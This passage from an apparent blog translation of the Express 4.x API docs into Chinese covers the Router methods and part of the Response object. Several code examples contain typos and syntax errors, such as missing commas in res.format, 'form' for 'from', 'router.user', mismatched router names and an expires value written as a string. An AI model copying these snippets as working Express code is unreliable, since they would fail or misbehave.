class="string">'/api/*'</span>,requireAuthentication);</span><br></pre></td></tr></table></figure><h3 id="router-METHOD-path-callback-…-callback"><a href="#router-METHOD-path-callback-…-callback" class="headerlink" title="router.METHOD(path,[callback,…] callback)"></a>router.METHOD(path,[callback,…] callback)</h3><p><code>router.METHOD()</code>方法在Express中提供路由功能，其中METHOD是HTTP方法之一，例如GET，POST，PUT等等，当然你可以小写。所以实际的方法是<code>router.get()</code>，<code>router.post()</code>，<code>router.put()</code>等等</p><blockquote><p><code>router.get()</code>函数将会自动的调用HTTP HEAD方法，除了<code>router.head()</code>在<code>router.get()</code>之前要求没有走这条路 </p></blockquote><p>你可以提供多个回调，每个回调都被平等对待，表现的就像中间件，除了这些回调函数可以调用<code>next(route)</code>绕过其余路由回调。您可以使用此机制在路由上执行预条件，然后在没有理由继续匹配路由的情况下将控制传递给后续路由。</p><p>下面片段展示了最简单的路由定义，Express将字符串转化为正则表达式，在内部用于匹配传入请求。执行这些匹配时不考虑查询字符串，例如’GET’将匹配下面路由，像<code>GET/?name=&#39;tobi&#39;</code></p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">router.get(<span class="string">'/'</span>,<span class="function"><span class="keyword">function</span>(<span class="params">req,res</span>)</span>&#123;</span><br><span class="line">    res.send(<span class="string">'hello world'</span>)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>如果你有非常具体的约束条件，还可以使用正则表达式。举个栗子下面将会匹配”GET /commits/71dbb9c”以及 “GET /commits/71dbb9c..4c084f9”.</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">router.get(<span class="regexp">/^\/commits\/(\w+)(?:\.\.(\w+))?$/</span>,<span class="function"><span class="keyword">function</span>(<span class="params">req,res</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="keyword">from</span> = req.params[<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">var</span> to = req.params[<span class="number">1</span>] || <span class="string">'HEAD'</span>;</span><br><span class="line">    res.send(<span class="string">'commit range'</span> + form + <span class="string">'..'</span> + to);</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h3 id="router-param-name-callback"><a href="#router-param-name-callback" class="headerlink" title="router.param(name, callback)"></a>router.param(name, callback)</h3><p>添加回调触发到路由参数中，name是参数的名称，callback是回调函数。虽然name在技术上是可选的，但是从Express v4.11.0没有它是不推荐使用这种方法的（如下）</p><ul><li>req，请求对象</li><li>res，响应对象</li><li>next，指示下一个中间件的功能</li><li>name参数的值</li><li>参数的名称</li></ul><blockquote><p>不像<code>app.param()</code>,<code>router.param()</code>不接受数组参数</p></blockquote><p>举个栗子，当<code>:user</code>在路由路径中存在时，可以将用户加载映射为自动提供<code>req.user</code>给这个路由，或者执行验证的参数输入</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">router.param(<span class="string">'user'</span>,<span class="function"><span class="keyword">function</span>(<span class="params">req,res,next,id</span>)</span>&#123;</span><br><span class="line">    <span class="comment">//尝试从用户模型获取用户详细信息并将其附加到请求对象</span></span><br><span class="line">    User.find(id,<span class="function"><span class="keyword">function</span>(<span class="params">err,user</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(err)&#123;</span><br><span class="line">            next(err);</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>(user)&#123;</span><br><span class="line">            req.user = user;</span><br><span class="line">            next();</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            next(<span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">'fail to load user'</span>))</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;) </span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>该回调方法是在本地路由器上定义他们，它们不是由加载的应用程序或路由器继承的。因此，定义在路由上的参数回调只有通过<code>router</code>定义的路由参数才会触发</p><p>一个回调参数将被称为一次请求响应周期，即使参数在多个路径中匹配，如下面的栗子所示：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">router.param(<span class="string">'id'</span>,<span class="function"><span class="keyword">function</span>(<span class="params">req,res,next,id</span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'CALLED ONLY ONCE'</span>);</span><br><span class="line">    next();</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">router.get(<span class="string">'/user/:id'</span>,<span class="function"><span class="keyword">function</span>(<span class="params">req,res,next</span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'although this matchs '</span>);</span><br><span class="line">    next();</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">router.get(<span class="string">'/user/:id'</span>,<span class="function"><span class="keyword">function</span>(<span class="params">req,res</span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'and this matchs too '</span>);</span><br><span class="line">    res.end();</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>将会依次打印：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">CAALED ONLY ONCE</span><br><span class="line">although <span class="keyword">this</span> matchs</span><br><span class="line">and <span class="keyword">this</span> matchs too</span><br></pre></td></tr></table></figure><blockquote><p>以下部分描述<code>router.param(callback)</code>在v4.11.0将是过时的</p></blockquote><p><code>router.param(name,callback)</code>方法的行为通过仅传递一个函数到<code>router.param()</code>将会完全改变。此功能是如何实现<code>router.param(name,callback)</code>的习惯-它接受两个参数，必须返回一个中间件</p><p>函数返回的中间件决定了URL参数被捕获时发生的行为</p><p>在下面这个例子中，<code>router.param(name,callback)</code>签名被修改为<code>router.param(name, accessId)</code>。<code>router.param()将会接受一个</code>name<code>和一个</code>number<code>而不是一个</code>name<code>和一个</code>回调函数`</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">'express'</span>);</span><br><span class="line"><span class="keyword">var</span> app = express();</span><br><span class="line"><span class="keyword">var</span> router = express.Router();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 定制 `router.param()`的功能</span></span><br><span class="line">router.param(<span class="function"><span class="keyword">function</span>(<span class="params">param,option</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="function"><span class="keyword">function</span>(<span class="params">req,res,next,val</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(val == option)&#123;</span><br><span class="line">            next();</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            res.sendStatus(<span class="number">403</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用定制的`router.param()`</span></span><br><span class="line">router.param(<span class="string">'id'</span>,<span class="number">1337</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 触发捕获的路由</span></span><br><span class="line">router.get(<span class="string">'/user/:id'</span>,<span class="function"><span class="keyword">function</span>(<span class="params">req,res</span>)</span>&#123;</span><br><span class="line">    res.send(<span class="string">'OK'</span>)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.use(router);</span><br><span class="line"></span><br><span class="line">app.listen(<span class="number">3000</span>,<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'Ready'</span>);</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>在这个栗子中，<code>router.param(name,callback)</code>签名是相同的，但不是一个中间件回调，一个自定义检查函数定义了验证用户ID</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">router.param(<span class="function"><span class="keyword">function</span>(<span class="params">param,validator</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="function"><span class="keyword">function</span>(<span class="params">req,res,next,val</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(validator(val))&#123;</span><br><span class="line">            next();</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            res.sendStatus(<span class="number">403</span>)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">router.param(<span class="string">'id'</span>,<span class="function"><span class="keyword">function</span>(<span class="params">candidate</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> !<span class="built_in">isNaN</span>(<span class="built_in">parseFloat</span>(candidate)) &amp;&amp; <span class="built_in">isFinite</span>(candidate)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h3 id="router-route-path"><a href="#router-route-path" class="headerlink" title="router.route(path)"></a>router.route(path)</h3><p>返回单个路由的实例，您可以使用可选中间件来处理HTTP verbs，使用<code>router.route()</code>为了避免重复路由命名，从而键入错误。</p><p>在上面<code>router.param()</code>栗子的基础上，下面的栗子展示了如何使用<code>router.route()</code>指定HTTP处理方法</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> router = express.Router();</span><br><span class="line"></span><br><span class="line">router.param(<span class="string">'user_id'</span>,<span class="function"><span class="keyword">function</span>(<span class="params">req,res,next,id</span>)</span>&#123;</span><br><span class="line">    <span class="comment">// 示例用户，可能实际将从db等获取</span></span><br><span class="line">    req.user = &#123;</span><br><span class="line">        id:id,</span><br><span class="line">        name:<span class="string">'TJ'</span></span><br><span class="line">    &#125;;</span><br><span class="line">    next();</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">router.route(<span class="string">'/users/:user_id'</span>)</span><br><span class="line">.all(<span class="function"><span class="keyword">function</span>(<span class="params">req,res,next</span>)</span>&#123;</span><br><span class="line">    <span class="comment">// ..</span></span><br><span class="line">    next()</span><br><span class="line">&#125;)</span><br><span class="line">.get(<span class="function"><span class="keyword">function</span>(<span class="params">req,res,next</span>)</span>&#123;</span><br><span class="line">    res.json(req.user)</span><br><span class="line">&#125;)</span><br><span class="line">.put(<span class="function"><span class="keyword">function</span>(<span class="params">req,res</span>)</span>&#123;</span><br><span class="line">    req.user.name = req.params.name;</span><br><span class="line">    <span class="comment">// 保存用户等</span></span><br><span class="line">    res.json(req.user) </span><br><span class="line">&#125;)</span><br><span class="line">.post(<span class="function"><span class="keyword">function</span>(<span class="params">req,res,next</span>)</span>&#123;</span><br><span class="line">    next(<span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">'not implemented'</span>));</span><br><span class="line">&#125;)</span><br><span class="line">.delete(<span class="function"><span class="keyword">function</span>(<span class="params">req,res,next</span>)</span>&#123;</span><br><span class="line">    next(<span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">'not implemented'</span>))</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>这个方法再利用单一<code>/users/:user_id</code>路径并且为各种HTTP方法添加处理程序</p><h3 id="router-use-path-function-…-function"><a href="#router-use-path-function-…-function" class="headerlink" title="router.use([path], [function, …] function)"></a>router.use([path], [function, …] function)</h3><p>使用指定中间件函数或者函数，可选的参数是挂载路径，默认是”/“</p><p>这个方法类似于<code>app.use()</code>。下面展示了一个简单的示例和用例：</p><p>中间件就像是管道，请求在第一个中间件函数定义时开始，并为它们”向下”匹配每一条路径处理中间件堆栈处理。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">'express'</span>);</span><br><span class="line"><span class="keyword">var</span> app = express();</span><br><span class="line"><span class="keyword">var</span> router = express.Router();</span><br><span class="line"></span><br><span class="line">router.use(<span class="function"><span class="keyword">function</span>(<span class="params">req,res</span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'%s %s %s'</span>,req.method,req.url,req.path);</span><br><span class="line">    next();</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 下面只有当路径从挂载点开始时，才会调用这个函数</span></span><br><span class="line">router.use(<span class="string">'/bar'</span>,<span class="function"><span class="keyword">function</span>(<span class="params">req,res,next</span>)</span>&#123;</span><br><span class="line">    <span class="comment">// ..</span></span><br><span class="line">    next();</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 总是调用</span></span><br><span class="line">router.use(<span class="function"><span class="keyword">function</span>(<span class="params">req,res,next</span>)</span>&#123;</span><br><span class="line">    res.send(<span class="string">'Hello world'</span>)</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.use(<span class="string">'/foo'</span>,router);</span><br><span class="line"></span><br><span class="line">app.listen(<span class="number">3000</span>);</span><br></pre></td></tr></table></figure><p>“挂载”路径被剥离并且对中间件功能不可见。这个功能的主要作用是：不管它的”prefix前缀”路径，安装中间件功能可能没有代码的变化</p><p>为了保证您使用<code>router.use()</code>定义的中间件的重要性。他们按顺序调用，因此顺序定义中间件优先级。举个栗子：通常<code>logger</code>是您将使用的第一个中间件，因此每个请求都会被记录</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> logger = <span class="built_in">require</span>(<span class="string">'morgan'</span>);</span><br><span class="line"></span><br><span class="line">router.user(logger());</span><br><span class="line">router.use(express.static(__dirname+<span class="string">'/public'</span>));</span><br><span class="line">router.use(<span class="function"><span class="keyword">function</span>(<span class="params">req,res</span>)</span>&#123;</span><br><span class="line">    res.send(<span class="string">'hello'</span>)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>现在假设您忽略了对静态文件的日志请求,但是在<code>logger()</code>之后要继续记录路由和中间件定义。你只需简单的移动<code>express.static()</code>到顶部，在添加日志中间件之前即可。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">router.use(express.static(__dirname + <span class="string">'/public'</span>));</span><br><span class="line">router.use(logger());</span><br><span class="line">router.use(<span class="function"><span class="keyword">function</span>(<span class="params">req,res</span>)</span>&#123;</span><br><span class="line">    res.send(<span class="string">'Hello'</span>)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>另一个例子是从多个目录中服务文件，给予”/public”优先</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">app.use(express.static(__dirname + <span class="string">'/public'</span>));</span><br><span class="line">app.use(express.static(__dirname + <span class="string">'/files'</span>));</span><br><span class="line">app.use(express.static(__dirname + <span class="string">'/uploads'</span>));</span><br></pre></td></tr></table></figure><p><code>router.use()</code>方法也支持命名参数，这样，其他路由器的挂载点可以通过使用命名参数预加载来获益。</p><blockquote><p>NOTE:虽然这些中间件功能是通过特定路由器添加的,当他们运行时由他们连接到的路径来定义(而不是路由)。因此，如果路由器的路由匹配，则通过一个路由器添加的中间件可以运行其他路由器。举个栗子，下面显示安装在同一路径上的两个不同的路由器：</p></blockquote><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> autoRouter = express.Router();</span><br><span class="line"><span class="keyword">var</span> openRouter = express.Router();</span><br><span class="line"></span><br><span class="line">autoRouter.use(<span class="built_in">require</span>(<span class="string">'./authenticate'</span>).basic(usersdb));</span><br><span class="line"></span><br><span class="line">autoRouter.get(<span class="string">'/:user_id/edit'</span>,<span class="function"><span class="keyword">function</span>(<span class="params">req,res,next</span>)</span>&#123;</span><br><span class="line">    <span class="comment">// .. 编辑用户界面 .. </span></span><br><span class="line">&#125;)</span><br><span class="line">openRouter.get(<span class="string">'/'</span>,<span class="function"><span class="keyword">function</span>(<span class="params">req,res,next</span>)</span>&#123;</span><br><span class="line">    <span class="comment">// .. 用户列表 ..</span></span><br><span class="line">&#125;)</span><br><span class="line">openRouter.get(<span class="string">'/:user_id'</span>,<span class="function"><span class="keyword">function</span>(<span class="params">req,res,next</span>)</span>&#123;</span><br><span class="line">    <span class="comment">// .. 查看用户 .. </span></span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.use(<span class="string">'/users'</span>,authRouter);</span><br><span class="line">app.use(<span class="string">'/users'</span>,openRouter);</span><br></pre></td></tr></table></figure><p>尽管<code>authenticate</code>中间件是通过<code>autoRouter</code>路由加入的,但是它也将运行在openRouter定义的路由上，因为两个路由器都挂载在<code>/users</code>。为了避免这种行为发生，为每个路由器使用不同的路径。</p><h1 id="写在后面"><a href="#写在后面" class="headerlink" title="写在后面"></a>写在后面</h1><p>Express文档中Router部分就完成了，本人学识有限，难免有所纰漏或者理解不当之处，翻译仅仅是方便个人学习交流使用，无其他用意，原文地址：<a href="http://www.expressjs.com.cn/4x/api.html#res" target="_blank" rel="noopener">expressjs.com</a></p>]]></content>
      
      
      <categories>
          
          <category> Node </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Node </tag>
            
            <tag> Express </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Express4.x API (三)：Response (译)</title>
      <link href="/2017/12/21/express-api-cn-response/"/>
      <url>/2017/12/21/express-api-cn-response/</url>
      
        <content type="html"><![CDATA[<h1 id="Express4-x-API-译文-系列文章"><a href="#Express4-x-API-译文-系列文章" class="headerlink" title="Express4.x API 译文 系列文章"></a>Express4.x API 译文 系列文章</h1><ul><li><a href="http://www.cnblogs.com/okaychen/p/8108405.html" target="_blank" rel="noopener">Express4.x API (一)：application (译) – 完成</a></li><li><a href="http://www.cnblogs.com/okaychen/p/8081275.html" target="_blank" rel="noopener">Express4.x API (二)：request (译) – 完成</a></li><li><a href="http://www.cnblogs.com/okaychen/p/8087425.html" target="_blank" rel="noopener">Express4.x API (三)：Response (译) – 完成</a></li><li><a href="http://www.cnblogs.com/okaychen/p/8093717.html" target="_blank" rel="noopener">Express4.x API (四)：router (译) – 完成</a></li></ul><a id="more"></a><h1 id="Response"><a href="#Response" class="headerlink" title="Response"></a>Response</h1><p><code>res</code>对象表示一个Express应用程序在收到HTTP请求时发送的HTTP响应(response)</p><p>在这篇文档和惯例中，HTTP响应这个对象总是被称为<code>res</code>(HTTP请求则是req)，但是它的实际名称取决于您正在工作的回调函数的参数.</p><p>举个栗子：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">app.get(<span class="string">'/user/:id'</span>,<span class="function"><span class="keyword">function</span>(<span class="params">req,res</span>)</span>&#123;</span><br><span class="line">    res.send(<span class="string">'user'</span> + req.params.id)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>当然你也可以这样：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">app.get(<span class="string">'/user/:id'</span>,<span class="function"><span class="keyword">function</span>(<span class="params">request,response</span>)</span>&#123;</span><br><span class="line">    response.send(<span class="string">'user'</span> + request.params.id)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h2 id="Properties"><a href="#Properties" class="headerlink" title="Properties"></a>Properties</h2><h3 id="res-app"><a href="#res-app" class="headerlink" title="res.app"></a>res.app</h3><p>此属性持有对使用中间件Express应用实例的引用</p><p><code>res.app</code>和在request对象中的<code>req.app</code>属性是完全相同的</p><h3 id="res-headersSent"><a href="#res-headersSent" class="headerlink" title="res.headersSent"></a>res.headersSent</h3><p>布尔属性，表示这个app是否发送了HTTP头进行响应</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">app.get(<span class="string">'/'</span>,<span class="function"><span class="keyword">function</span>(<span class="params">req,res</span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(res.headersSend);  <span class="comment">// false</span></span><br><span class="line">    res.send(<span class="string">'ok'</span>);</span><br><span class="line">    <span class="built_in">console</span>.log(res.headersSend); <span class="comment">// true</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h3 id="res-locals"><a href="#res-locals" class="headerlink" title="res.locals"></a>res.locals</h3><p>一个对象包含局部变量作用域的请求的响应，因此只能用于在request/response周期中呈现的视图(如果有的话)。否者，此属性与app.locals是相同的</p><p>此属性用于公开<code>request-level</code>信息，例如请求的路径名(path name)，经过身份认证的用户(authenticated user),用户设置(user setting)等等</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">app.use(<span class="function"><span class="keyword">function</span>(<span class="params">req,res,next</span>)</span>&#123;</span><br><span class="line">    res.locals.user = req.user;</span><br><span class="line">    req.locals.authenticated = !req.user.anonymous;</span><br><span class="line">    next();</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h2 id="Methods"><a href="#Methods" class="headerlink" title="Methods"></a>Methods</h2><h3 id="res-append-field-value"><a href="#res-append-field-value" class="headerlink" title="res.append(field[,value])"></a>res.append(field[,value])</h3><blockquote><p>res.append在Expressv4.11.0+是支持的</p></blockquote><p>将指定的值到http响应头字段.如果header还没有被设置，它创建具有指定值的头文件，<code>value</code>参数可以是字符串或数组</p><p>如果<code>res.set()</code>在<code>res.append()</code>之后的话将会重置以前设置的header头</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">res.append(<span class="string">'Link'</span>,[<span class="string">'&lt;http://localhost/&gt;'</span>,<span class="string">'&lt;http://localhost:3000/&gt;'</span>])</span><br><span class="line">res.append(<span class="string">'Set-Cookie'</span>,<span class="string">'foo=bar;path=/;HttpOnly'</span>)</span><br><span class="line">res.append(<span class="string">'Warning'</span>,<span class="string">'199 Miscellaneous warning'</span>)</span><br></pre></td></tr></table></figure><h3 id="res-attachment-filename"><a href="#res-attachment-filename" class="headerlink" title="res.attachment([filename])"></a>res.attachment([filename])</h3><p>使用<code>attchment</code>设置HTTP响应<code>Content-Dispositon</code>头字段.如果给了一个文件名<code>filename</code>，然后基于扩展名通过<code>res.type()</code>设置<code>Content-Type</code>,并设置<code>Content-Disposition</code>“fliename=”参数</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">res.attachment();</span><br><span class="line"><span class="comment">// Content-Disposition:attachment</span></span><br><span class="line"></span><br><span class="line">res.attachment(<span class="string">'path/to/logo.png'</span>);</span><br><span class="line"><span class="comment">// Content-Disposition:attachment;filename='logo.png'</span></span><br><span class="line"><span class="comment">// Content-Type:image/png</span></span><br></pre></td></tr></table></figure><h3 id="res-cookie-name-value-options"><a href="#res-cookie-name-value-options" class="headerlink" title="res.cookie(name,value[,options])"></a>res.cookie(name,value[,options])</h3><p>给cookie名称设置值，<code>value</code>参数可以是一个字符串或者是对象转化为JSON，options参数可以是具有以下属性的对象</p><table><thead><tr><th>Property</th><th>Type</th><th>Description</th></tr></thead><tbody><tr><td>domain</td><td>String</td><td>cookie的域名，默认应用程序的域名</td></tr><tr><td>expires</td><td>Date</td><td>格林尼治时间内cookie的到期日期，如果没有指明或设置为0，创建会话cookie</td></tr><tr><td>httpOnly</td><td>Boolean</td><td>标志cookie只能由web服务器访问</td></tr><tr><td>maxAge</td><td>String</td><td>在毫秒内设置相对于当前时间的方便选项</td></tr><tr><td>path</td><td>String</td><td>cookie的路径，默认为’/‘</td></tr><tr><td>secure</td><td>Boolean</td><td>标记只于https一起使用的cookie</td></tr><tr><td>signed</td><td>Boolean</td><td>指示cookie是否被签署</td></tr></tbody></table><blockquote><p>提供带有选项设置的HTTP <code>Set-Cookie``res.cookie</code>起作用，未指定的任何选项默认值为<a href="http://tools.ietf.org/html/rfc6265" target="_blank" rel="noopener">RFC 6265</a></p></blockquote><p>举个栗子：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">res.cookie(<span class="string">'name'</span>,<span class="string">'tobi'</span>,&#123;<span class="attr">domain</span>:<span class="string">'example.com'</span>,<span class="attr">path</span>:<span class="string">'/admin'</span>,<span class="attr">secure</span>:<span class="literal">true</span>&#125;);</span><br><span class="line">res.cookie(<span class="string">'rememberme'</span>,<span class="string">'1'</span>,&#123;<span class="attr">expires</span>:<span class="string">'new Dtae(Date.now() + 900000),httpOnly：true'</span>&#125;)</span><br></pre></td></tr></table></figure><p><code>maxAge</code>选项是以当前时间为起点以毫秒为单位设置<code>expires</code>的便捷选项，下面这个栗子相当于上面例子中的第二个</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">res.cookie(<span class="string">'rememberme'</span>,<span class="string">'1'</span>,&#123;<span class="attr">maxAge</span>:<span class="number">900000</span>,<span class="attr">httpOnly</span>:<span class="literal">true</span>&#125;)</span><br></pre></td></tr></table></figure><p>你可以传递一个对象给<code>value</code>参数,然后通过<code>bodyparser</code>中间件将其序列化为JSON</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">res.cookie(<span class="string">'cart'</span>,&#123;<span class="attr">items</span>:[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>]&#125;)</span><br><span class="line">res.cookie(<span class="string">'cart'</span>,&#123;<span class="attr">items</span>:[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>]&#125;,&#123;<span class="attr">maxAge</span>:<span class="number">900000</span>&#125;)</span><br></pre></td></tr></table></figure><p>当使用<code>cookie-parser</code>中间件时，此方法还支持签署cookie，只需要设置<code>signed</code>选项为true。然后<code>res.cookie()</code>将会秘密的传递给<code>cookieParser(secret)</code>去签署这个值</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">res.cookie(<span class="string">'name'</span>,<span class="string">'tobi'</span>,&#123;<span class="attr">signed</span>:<span class="literal">true</span>&#125;)</span><br></pre></td></tr></table></figure><p>然后你可以通过<code>req.signedCookie()</code>访问此值</p><h3 id="res-clearCookie-name-options"><a href="#res-clearCookie-name-options" class="headerlink" title="res.clearCookie(name,[,options])"></a>res.clearCookie(name,[,options])</h3><p>通过cookie名称清除指定的cookie</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">res.cookie(<span class="string">'rememberme'</span>,<span class="string">'tobi'</span>,&#123;<span class="attr">path</span>:<span class="string">'/admin'</span>&#125;);</span><br><span class="line">res.clearCookie(<span class="string">'rememberme'</span>,&#123;<span class="attr">path</span>:<span class="string">'/admin'</span>&#125;)</span><br></pre></td></tr></table></figure><h3 id="res-download-path-fliename-fn"><a href="#res-download-path-fliename-fn" class="headerlink" title="res.download(path,[,fliename][,fn])"></a>res.download(path,[,fliename][,fn])</h3><p>将路径中文件作为<code>附件(attachment)</code>传输.通常，浏览器将提示用户下载.默认情况下，<code>Content-Disposition</code>头中”filename=”参数是路径（这通常出现在浏览器对话框），用<code>filename</code>参数覆盖默认值</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">res.download(<span class="string">'/report-12345.pdf'</span>);</span><br><span class="line"></span><br><span class="line">res.download(<span class="string">'/report-12345.pdf'</span>,<span class="string">'report.pdf'</span>);</span><br><span class="line"></span><br><span class="line">res.download(<span class="string">'/report-12345.pdf'</span>,<span class="string">'report.pdf'</span>,<span class="function"><span class="keyword">function</span>(<span class="params">err</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(err)&#123;</span><br><span class="line">        <span class="comment">// 处理错误，但是请记得响应可能是部分发送的</span></span><br><span class="line">        <span class="comment">// 所以检查`res.headerssent`</span></span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="comment">// 减量下载，等</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h3 id="res-end-data-encoding"><a href="#res-end-data-encoding" class="headerlink" title="res.end([data][,encoding])"></a>res.end([data][,encoding])</h3><p>结束响应进程，This method actually comes from Node core, specifically the <a href="https://nodejs.org/api/http.html#http_response_end_data_encoding_callback" target="_blank" rel="noopener">response.end() method of http.ServerResponse</a>.（这句话翻译过来我有些不理解，我就不再翻译，res.end用于结束响应）</p><p>快速结束响应而无需任何数据，如果你需要对数据进行响应，取而代之的是使用诸如<code>res.send</code>和<code>res.json</code></p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">res.send();</span><br><span class="line">res.status(<span class="number">404</span>).end();</span><br></pre></td></tr></table></figure><h3 id="res-format-object"><a href="#res-format-object" class="headerlink" title="res.format(object)"></a>res.format(object)</h3><p>在请求对象时，在<code>Accept</code>HTTP头对象上执行<code>content-negotiation</code>。他使用<code>req.accepts</code>基于可接受的质量值的有序类型为请求选择一个处理程序，如果header未指定，调用第一个回调函数.当没有找到匹配项，服务器响应406<code>Not Acceptable</code>或调用默认回调函数</p><p>当选择回调时，将设置<code>Content-Type</code>响应头.然而你可以使用回调方法在回调中更改此值例如：<code>res.set</code>或者<code>res.type</code></p><p>下面这个例子当<code>Accept</code>头域设置为<code>applocation/json</code>或者<code>*/json</code>时，将会响应{‘message’:’hey’}(然而如果是”<em>/</em>“,响应将会是’hey’)</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">res.format(&#123;</span><br><span class="line">    <span class="string">'text/plain'</span>:<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        res.send(<span class="string">'hey'</span>)</span><br><span class="line">    &#125;,</span><br><span class="line"></span><br><span class="line">    <span class="string">'text/html'</span>:<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        res.send(<span class="string">'&lt;p&gt;hey&lt;/p&gt;'</span>)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="string">'applaction/json'</span>:<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        res.send(message:<span class="string">'hey'</span>)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="string">'default'</span>:<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="comment">// 记录请求并用406响应</span></span><br><span class="line">        res.status(<span class="number">406</span>).send(<span class="string">'Not Acceptable'</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>除了规范化MOME类型，对于稍微不太详细的实现你还可以使用扩展名映射到这些类型</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">res.format(&#123;</span><br><span class="line">    text:<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        res.send(<span class="string">'hey'</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    html:<span 